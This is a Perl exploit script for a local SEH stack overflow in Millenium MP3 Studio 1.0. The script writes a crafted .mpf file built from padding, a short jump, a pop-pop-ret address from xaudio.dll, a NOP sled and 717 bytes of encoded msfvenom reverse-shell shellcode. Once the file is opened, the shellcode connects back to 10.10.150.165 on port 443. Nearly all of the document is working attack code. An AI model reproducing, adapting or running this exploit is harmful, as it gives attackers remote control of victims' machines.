# [+] Vulnerability  : .mpf File Local Stack Overflow Exploit (SEH) #2
# [+] Product   : Millenium MP3 Studio
# [+] Versions affected : v1.0
# [+] Download          : http://www.software112.com/products/mp3-millennium+download.html
# [+] Method    : seh
# [+] Tested on         : Windows XP SP3 En
# [+] Written by        : L1inear
# [+] Greetz to         : Saumil & SK
# Based on PoC/findings by HACK4LOVE ( http://milw0rm.com/exploits/9277 
#
#
my $totalsize=5005;
my $sploitfile="c0d3r-final.mpf";
my $junk = "http:AA";
$junk=$junk."A" x 4105;
my $nseh="\xeb\x1e\x90\x90";  #jump 30 bytes
my $seh=pack('V',0x1001F668);  #pop pop ret from xaudio.dll
my $nops = "\x90" x 24;

# msfvenom -p windows/shell_reverse_tcp LHOST=10.10.150.165 LPORT=443 -e x86/alpha_upper exitfunc=seh -f perl

# size: 717 bytes

my $shellcode="\x89\xe7\xda\xd9\xd9\x77\xf4\x58\x50\x59\x49\x49\x49\x49" .
"\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56" .
"\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41" .
"\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42" .
"\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x4b\x4c\x5a" .
"\x48\x4c\x42\x35\x50\x43\x30\x53\x30\x45\x30\x4b\x39\x4d" .
"\x35\x36\x51\x4f\x30\x35\x34\x4c\x4b\x56\x30\x36\x50\x4c" .
"\x4b\x56\x32\x54\x4c\x4c\x4b\x30\x52\x32\x34\x4c\x4b\x53" .
"\x42\x47\x58\x34\x4f\x58\x37\x51\x5a\x51\x36\x46\x51\x4b" .
"\x4f\x4e\x4c\x37\x4c\x45\x31\x43\x4c\x55\x52\x36\x4c\x57" .
"\x50\x59\x51\x38\x4f\x34\x4d\x33\x31\x59\x57\x5a\x42\x4c" .
"\x32\x31\x42\x50\x57\x4c\x4b\x46\x32\x52\x30\x4c\x4b\x30" .
"\x4a\x47\x4c\x4c\x4b\x50\x4c\x52\x31\x53\x48\x4b\x53\x51" .
"\x58\x35\x51\x48\x51\x36\x31\x4c\x4b\x50\x59\x37\x50\x55" .
"\x51\x49\x43\x4c\x4b\x30\x49\x44\x58\x4d\x33\x37\x4a\x30" .
"\x49\x4c\x4b\x57\x44\x4c\x4b\x33\x31\x4e\x36\x56\x51\x4b" .
"\x4f\x4e\x4c\x49\x51\x38\x4f\x34\x4d\x35\x51\x39\x57\x30" .
"\x38\x4b\x50\x44\x35\x5a\x56\x55\x53\x53\x4d\x5a\x58\x37" .
"\x4b\x33\x4d\x31\x34\x34\x35\x4b\x54\x50\x58\x4c\x4b\x56" .
"\x38\x46\x44\x43\x31\x38\x53\x52\x46\x4c\x4b\x44\x4c\x50" .
"\x4b\x4c\x4b\x46\x38\x55\x4c\x45\x51\x58\x53\x4c\x4b\x35" .
"\x54\x4c\x4b\x43\x31\x48\x50\x4b\x39\x57\x34\x56\x44\x46" .
"\x44\x31\x4b\x31\x4b\x35\x31\x46\x39\x30\x5a\x56\x31\x4b" .
"\x4f\x4d\x30\x31\x4f\x51\x4f\x31\x4a\x4c\x4b\x52\x32\x4a" .
"\x4b\x4c\x4d\x31\x4d\x43\x58\x56\x53\x56\x52\x53\x30\x33" .
"\x30\x43\x58\x34\x37\x32\x53\x57\x42\x51\x4f\x36\x34\x52" .
"\x48\x50\x4c\x32\x57\x56\x46\x35\x57\x4b\x4f\x58\x55\x4f" .
"\x48\x5a\x30\x53\x31\x55\x50\x43\x30\x46\x49\x59\x54\x46" .
"\x34\x46\x30\x52\x48\x56\x49\x4d\x50\x42\x4b\x45\x50\x4b" .
"\x4f\x4e\x35\x46\x30\x50\x50\x50\x50\x56\x30\x31\x50\x56" .
"\x30\x47\x30\x30\x50\x52\x48\x4a\x4a\x44\x4f\x39\x4f\x4d" .
"\x30\x4b\x4f\x39\x45\x4c\x57\x33\x5a\x54\x45\x33\x58\x55" .
"\x5a\x54\x4a\x4c\x56\x4f\x55\x52\x48\x35\x52\x43\x30\x45" .
"\x51\x4f\x4b\x4c\x49\x5a\x46\x42\x4a\x54\x50\x50\x56\x31" .
"\x47\x35\x38\x4d\x49\x59\x35\x33\x44\x45\x31\x4b\x4f\x59" .
"\x45\x4c\x45\x59\x50\x53\x44\x34\x4c\x4b\x4f\x30\x4e\x55" .
"\x58\x33\x45\x4a\x4c\x32\x48\x5a\x50\x48\x35\x49\x32\x56" .
"\x36\x4b\x4f\x4e\x35\x32\x48\x42\x43\x52\x4d\x33\x54\x33" .
"\x30\x4b\x39\x5a\x43\x30\x57\x56\x37\x50\x57\x36\x51\x5a" .
"\x56\x43\x5a\x55\x42\x30\x59\x31\x46\x5a\x42\x4b\x4d\x55" .
"\x36\x59\x57\x31\x54\x56\x44\x37\x4c\x55\x51\x33\x31\x4c" .
"\x4d\x47\x34\x46\x44\x32\x30\x38\x46\x35\x50\x30\x44\x31" .
"\x44\x36\x30\x50\x56\x36\x36\x46\x36\x47\x36\x30\x56\x30" .
"\x4e\x50\x56\x56\x36\x46\x33\x46\x36\x43\x58\x43\x49\x38" .
"\x4c\x47\x4f\x4c\x46\x4b\x4f\x38\x55\x4c\x49\x4d\x30\x50" .
"\x4e\x50\x56\x57\x36\x4b\x4f\x36\x50\x45\x38\x43\x38\x4c" .
"\x47\x35\x4d\x55\x30\x4b\x4f\x58\x55\x4f\x4b\x4b\x4e\x54" .
"\x4e\x30\x32\x4b\x5a\x42\x48\x4e\x46\x4c\x55\x4f\x4d\x4d" .
"\x4d\x4b\x4f\x48\x55\x57\x4c\x55\x56\x43\x4c\x35\x5a\x4d" .
"\x50\x4b\x4b\x4b\x50\x43\x45\x45\x55\x4f\x4b\x50\x47\x52" .
"\x33\x43\x42\x42\x4f\x33\x5a\x53\x30\x56\x33\x4b\x4f\x59" .
"\x45\x41\x41";
my $junk2 = "D" x ($totalsize-length($junk.$nseh.$seh.$nops.$shellcode));
my $payload=$junk.$nseh.$seh.$nops.$shellcode.$junk2;
#
print " [+] Writing exploit file $sploitfile\n";
open (myfile,">$sploitfile");
print myfile $payload;
close (myfile);
print " [+] File written\n";
print " [+] " . length($payload)." bytes\n";
